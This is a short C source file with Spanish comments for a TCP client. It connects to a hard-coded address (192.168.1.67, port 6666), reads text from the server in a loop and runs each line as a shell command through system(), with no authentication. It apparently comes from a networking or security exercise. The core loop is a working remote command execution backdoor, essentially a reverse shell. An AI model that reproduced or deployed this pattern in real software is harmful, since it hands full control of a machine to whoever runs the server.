#include "../include/cliente.h"


int main (int argc, char *argv[]){
  
  if(signal(SIGINT, sig_handler)==SIG_ERR)
  {
    printf("No se pudo registrar el manejador para Ctrl-C\n");
  }
  
  puerto = 6666;
  ip = "192.168.1.67";
  struct sockaddr_in addin;
  printf("Conectando al servidor...\n");
  sckdes=crear_socket_cliente(puerto, ip, (struct sockaddr *)&addin);
  if(conectar(sckdes, (struct sockaddr *)&addin) != -1)
  {
    printf(">>> Conexion establecida con el servidor\n");
    char comando[MAX_LINE];
    while(leer_socket(sckdes,comando,MAX_LINE) > 1)
    {
      
      printf(">> %s",comando);
      // Ejecución del comando
      system(comando);
      // Envío de respuesta al servidor
    }
  }else
  {
   printf("[*] No se ha podido conectar con el servidor\n"); 
  }
  cerrar_cliente();
}

/*
#########################################
#					#
#		Métodos			#
#					#
#########################################
*/

int crear_socket_cliente(int puerto, char* host, struct sockaddr *sock_client)
{
  int sck = socket(AF_INET, SOCK_STREAM, 0);
  ((struct sockaddr_in*)sock_client)->sin_family = AF_INET;
  ((struct sockaddr_in*)sock_client)->sin_port = htons(puerto);
  ((struct sockaddr_in*)sock_client)->sin_addr.s_addr = inet_addr(host);
  bzero(&(((struct sockaddr_in*)sock_client)->sin_zero),8);
  return sck;
}

/**Conectar al host especificado por addin por medio del socket
 sck, retorna 0 si la conexion es exitosa, -1 de lo contrario*/
int conectar(int sck,struct sockaddr *addin)
{
    int conexion=connect(sck, addin, sizeof(struct sockaddr));
    return conexion;
}

void cerrar_cliente()
{
  printf(" Se cierra la conexión\n");
  close(sckdes);
  exit(0);
}

void sig_handler(int signal)
{
  switch(signal)
  {
    case SIGINT:
      //Se precionó Ctrl-C
      cerrar_cliente();
      break;
    default: break;
  }
  return;
}